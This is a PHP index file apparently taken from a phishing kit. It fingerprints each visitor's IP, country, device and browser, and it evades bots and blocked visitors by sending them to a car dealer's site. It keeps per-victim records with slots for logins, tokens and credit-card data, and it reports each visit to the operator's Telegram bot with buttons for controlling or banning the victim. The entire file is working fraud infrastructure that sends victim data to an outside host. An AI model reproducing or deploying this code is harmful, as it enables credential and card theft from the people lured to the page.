<?php
	error_reporting(0);
    session_start();
    include "./antibots-debug/antibots.php";
	include "./libraries/UserInfo.php";
	include "./setting/config.php";
	include "./setting/functions.php";

    function isBlocked($ip) {
        $blockedIPs = file_get_contents('./panel/actions/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }
    
    $userIP = get_client_ip();

    if (isBlocked($userIP)) {
        header("Location: https://www.superhonda.com/");
        exit();
    }

	$ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }

    $statics_file = "./panel/get-panel/statics.json";
    $statics_data = file_get_contents($statics_file);
    $panel_data = json_decode($statics_data, true);
    $panel_data['total_visit'] += 1;
    $updated_statics_data = json_encode($panel_data);
    file_put_contents($statics_file, $updated_statics_data);

    $main_path = MAIN_PATH;
    $link_panel = "https://" . $_SERVER['HTTP_HOST'] . "/$main_path/control-panel/panel.php?id_user=$ip";
    $ban_ip = "https://" . $_SERVER['HTTP_HOST'] . "/$main_path/panel/actions/block_user.php?block_user=$ip";
    $main_panel = "https://" . $_SERVER['HTTP_HOST'] . "/$main_path/panel/pages/main_panel.php";
    $panel_telegram = "https://" . $_SERVER['HTTP_HOST'] . "/$main_path/control-panel/check-action.php?id_user=$ip";
    $randomNumber = rand(0, 1000000);
    $user_ip = get_client_ip(). " - " . $_SESSION['code_country_visit']; 
    $id_user = $randomNumber; 
    $current_page = "IN WEBSITE"; 
    $timestamp =  date("Y-m-d H:i:s");
    $userStatus = "<span class='online'>Online</span>";
    $user_agent =   "DEVICE: ".UserInfo::get_device() ."</br>"."SYSTEM: ". UserInfo::get_os() ."</br>"."BROWSER: ".UserInfo::get_browser();
    $remove_ID = $ip.".json";
    $block_user = get_client_ip();
    $user_data = "$id_user,$user_ip,$timestamp,$user_agent,$link_panel,$remove_ID,$block_user\n";
    file_put_contents("./panel/get-panel/info-panel.txt", $user_data, FILE_APPEND);

    $_SESSION["panel_control"] = $link_panel;
    $_SESSION["panel_telegram"] = $panel_telegram;
    $_SESSION["main_panel"] = $main_panel;
    $_SESSION["id_user"] = $id_user;

    $user_data = array(
        'userStatus' => $userStatus,
        'id_user' => $id_user,
        'current_page' => $current_page,
        'user_ip' => $user_ip,
        'timestamp' => $timestamp,
        'user_agent' => $user_agent,
        "error_login" => 0,
        "error_token" => 0,
        "error_information" => 0,
        "error_credit_card" => 0,
        "error_email_approvation" => 0,
        "error_QR" => 0,
        "error_extra_information" => 0,
        "extra_information" => "",
        "QR_image_target" => "",
        "data" => array(
            'data_1' => "",
            'data_2' => "",
            'data_3' => "",
            'data_4' => "",
            'data_5' => "",
            'data_6' => "",
            'data_7' => "",
            'data_8' => "",
            'data_9' => "",
            'data_10' => "",
            'data_11' => "",
            'data_12' => "",
            'data_13' => "",
            'data_14' => "",
            'data_15' => ""
        ),
        'redirect_user' => " " 
    );

    $json_data = json_encode($user_data);
    $name_file = $ip;
    $file_path = "./panel/storage/{$name_file}.json";

    if (file_exists($file_path)) {
        unlink($file_path);
    }
    file_put_contents($file_path, $json_data);

    // Send Data To Telegram :
    $message =
    "👥========= VISIT =========👥\r\n" . 
    "📍IP - ".get_client_ip()."\t\t | \t\t". 
    $_SESSION['code_country_visit'] ."\r\n". 
    "💻 DEVICE = " .UserInfo::get_device()."\r\n".
    "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n".
    "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n";

    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => '🕹 Panel Control For : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
                    "url" => "$link_panel"
                ]
            ],
            [
                [
                    "text" => "⛔ Ban ⛔",
                    "url" => "$ban_ip"
                ]
            ],
            [
                [
                    "text" => "📊 Main Panel 📊",
                    "url" => "$main_panel"
                ]
            ],
        ]
    ]);

    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $message,
        "reply_markup" => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    // Save Data In Document Text :
    $text_to_result = "========= VISIT =========\r\n" . 
    "IP - ".get_client_ip()."\t\t | \t\t". 
    $_SESSION['code_country_visit'] ."\r\n". 
    " DEVICE = " .UserInfo::get_device()."\r\n".
    " SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    " BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n";

    $file = fopen("./file/file.txt", "a");
    fwrite($file, $text_to_result. "\n");
    fclose($file);

    echo 
    "<script>
        window.location = './pages/';
    </script>";
exit;
?>

